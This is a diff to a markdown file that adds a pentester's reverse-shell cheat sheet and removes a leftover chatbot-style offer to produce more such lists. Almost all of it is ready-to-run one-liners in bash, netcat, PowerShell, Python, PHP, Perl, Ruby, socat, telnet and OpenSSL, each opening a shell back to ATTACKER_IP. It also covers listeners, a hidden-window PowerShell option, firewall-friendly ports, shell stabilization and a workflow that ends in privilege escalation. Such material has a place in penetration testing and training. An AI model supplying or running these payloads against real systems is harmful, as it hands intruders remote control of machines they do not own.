@@ -321,13 +321,211 @@ Attacker → Gains Shell Access
 ```
 
 ---
+# 🔁 Reverse Shell Cheat Sheet – Pentester Quick Reference
 
-If you want, I can also create:
+---
 
-- Reverse Shell Cheat Sheet (table only)
-    
-- PowerShell reverse shell cheat sheet
-    
-- Linux reverse shell cheat sheet
-    
-- Fully categorized reverse shell payload list (HTB style)
+# 1️⃣ Reverse Shell Overview
+
+|Feature|Description|
+|---|---|
+|Definition|Target connects back to attacker to provide shell access|
+|Listener Location|Attacker machine|
+|Client Location|Target machine|
+|Connection Direction|Target → Attacker|
+|Firewall Bypass|Yes (outbound allowed)|
+|Detection Risk|Lower than bind shell|
+|Most Common Shell Type|Reverse shell|
+
+---
+
+# 2️⃣ Listener Setup (Attacker)
+
+|Tool|Command|
+|---|---|
+|Netcat|nc -lvnp 4444|
+|Netcat (sudo)|sudo nc -lvnp 4444|
+|Listen on common port|nc -lvnp 443|
+|Listen UDP|nc -luvp 4444|
+
+---
+
+# 3️⃣ Bash Reverse Shell (Linux)
+
+|Method|Command|
+|---|---|
+|Bash TCP|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1|
+|Bash alternative|/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1|
+|Bash exec|exec bash -i &>/dev/tcp/ATTACKER_IP/4444 <&1|
+
+---
+
+# 4️⃣ Netcat Reverse Shell (Linux)
+
+|Version|Command|
+|---|---|
+|Traditional netcat|nc ATTACKER_IP 4444 -e /bin/bash|
+|Using sh|nc ATTACKER_IP 4444 -e /bin/sh|
+|Named pipe method|rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|
+
+---
+
+# 5️⃣ Netcat Reverse Shell (Windows)
+
+|Shell|Command|
+|---|---|
+|cmd.exe|nc.exe ATTACKER_IP 4444 -e cmd.exe|
+|PowerShell|nc.exe ATTACKER_IP 4444 -e powershell.exe|
+
+---
+
+# 6️⃣ PowerShell Reverse Shell (Windows)
+
+|Method|Command|
+|---|---|
+|Standard|powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 \| Out-String );$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"|
+|Hidden window|powershell -nop -w hidden -c TCPClient|
+|Encoded|powershell -EncodedCommand BASE64|
+
+---
+
+# 7️⃣ Python Reverse Shell
+
+|Version|Command|
+|---|---|
+|Python3|python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'|
+|Python2|python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'|
+
+---
+
+# 8️⃣ PHP Reverse Shell
+
+|Method|Command|
+|---|---|
+|PHP exec|php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'|
+|PHP system|php -r '$sock=fsockopen("ATTACKER_IP",4444);system("/bin/sh -i");'|
+
+---
+
+# 9️⃣ Perl Reverse Shell
+
+|Method|Command|
+|---|---|
+|Perl shell|perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'|
+
+---
+
+# 🔟 Ruby Reverse Shell
+
+|Method|Command|
+|---|---|
+|Ruby shell|ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'|
+
+---
+
+# 1️⃣1️⃣ Socat Reverse Shell
+
+|Machine|Command|
+|---|---|
+|Attacker listener|socat TCP-LISTEN:4444,reuseaddr,fork STDOUT|
+|Target reverse shell|socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash|
+
+---
+
+# 1️⃣2️⃣ Reverse Shell Using sh
+
+|Method|Command|
+|---|---|
+|sh shell|sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1|
+|POSIX shell|/bin/sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1|
+
+---
+
+# 1️⃣3️⃣ Reverse Shell Using Telnet
+
+|Machine|Command|
+|---|---|
+|Attacker|nc -lvnp 4444|
+|Target|telnet ATTACKER_IP 4444 \| /bin/bash \| telnet ATTACKER_IP 4445|
+
+---
+
+# 1️⃣4️⃣ Reverse Shell Using OpenSSL
+
+|Machine|Command|
+|---|---|
+|Listener|openssl s_server -quiet -key key.pem -cert cert.pem -port 4444|
+|Target|openssl s_client -connect ATTACKER_IP:4444 \| /bin/bash|
+
+---
+
+# 1️⃣5️⃣ Shell Stabilization Commands
+
+|Purpose|Command|
+|---|---|
+|Spawn tty|python3 -c 'import pty; pty.spawn("/bin/bash")'|
+|Fix terminal|export TERM=xterm|
+|Background shell|CTRL + Z|
+|Fix input|stty raw -echo; fg|
+
+---
+
+# 1️⃣6️⃣ Verification Commands After Shell Access
+
+|Command|Purpose|
+|---|---|
+|whoami|Current user|
+|hostname|Machine name|
+|id|User privileges|
+|uname -a|OS info|
+|pwd|Current directory|
+|ls|List files|
+
+---
+
+# 1️⃣7️⃣ Common Ports Used
+
+|Port|Reason|
+|---|---|
+|443|HTTPS allowed outbound|
+|80|HTTP allowed outbound|
+|53|DNS allowed outbound|
+|4444|Common pentesting port|
+|8080|Alternative HTTP|
+
+---
+
+# 1️⃣8️⃣ Reverse Shell Workflow
+
+|Step|Action|
+|---|---|
+|1|Start listener|
+|2|Execute payload on target|
+|3|Target connects back|
+|4|Shell established|
+|5|Run commands|
+|6|Escalate privileges|
+
+---
+
+# 1️⃣9️⃣ Listener Quick Reference
+
+|Tool|Command|
+|---|---|
+|Netcat|nc -lvnp 4444|
+|Socat|socat TCP-LISTEN:4444 STDOUT|
+|Metasploit|use exploit/multi/handler|
+
+---
+
+# 2️⃣0️⃣ Most Important Reverse Shell Commands (Quick Use)
+
+|Language|Command|
+|---|---|
+|Bash|bash -i >& /dev/tcp/IP/4444 0>&1|
+|Netcat|nc IP 4444 -e /bin/bash|
+|PowerShell|powershell TCPClient|
+|Python|python3 socket reverse shell|
+|PHP|php fsockopen reverse shell|
+
+---
